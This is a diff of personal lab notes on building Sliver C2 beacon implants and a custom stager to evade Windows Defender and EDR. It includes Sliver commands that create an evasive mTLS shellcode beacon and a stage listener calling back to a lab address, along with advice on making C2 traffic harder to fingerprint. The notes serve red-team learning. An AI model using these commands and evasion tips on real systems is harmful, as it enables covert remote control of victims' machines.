@@ -17,7 +17,7 @@
 - Beacon implant: checks in periodically for new commands, less noisy.
 - Why build a custom payload? The simple answer is if its well known in the offensive space, then its most likely well known in the defensive space as well, including to EDR and AV vendors. Payloads created with default setups will usually be able to be picked up by security solutions almost instantly. An example of this is to create a default msfvenom payload yourself then try to place it on your Windows desktop (or a windows VM if you're using another OS) with Defender ON. https://redheadsec.tech/building-a-simple-custom-implant-for-sliver-shellcode/
 - But normally staged payloads are preferable as it allows for a smaller footprint for AV to hit on when they are loaded on to the system.
-- mtls better for encryption, https better for stealth
+- mtls better for encryption, https better for stealth. Actually apparently for our purposes, mtls is just better. --mtls is better than --http in this case because it encrypts and authenticates both sides of the connection, making your Sliver beacon's C2 traffic harder to detect or fingerprint by EDRs and network security tools — even though it doesn’t directly affect Defender AV detection.
   
 ---
 
@@ -177,6 +177,15 @@ $mem = [Exec]::VirtualAlloc(0, $size, 0x3000, 0x40)
 Generating a default executable beacon implant to see if Windows Defender will pick it up: ` generate beacon --name exe-beacon --format exe --arch amd64 --http https://192.168.56.1:8443 --c2profile default --evasion` (Tried transferring onto Windows raw .exe file AND base64 encoded - GOT FLAGGED - executables are easily flagged)
 
 
+---
+
+### April 1
+`profiles new beacon --mtls 192.168.56.1 --format shellcode --arch amd64 --evasion default_beacon_profile`
+
+`stage-listener --url tcp://192.168.56.1:8443 --profile default_beacon_profile`
+
+### April 4
+creating a custom stager to get the implant on the Windows machine. I'm developing the stager on the vm because I've read that it is better to develop code meant for Windows on Windows.
 
 
 
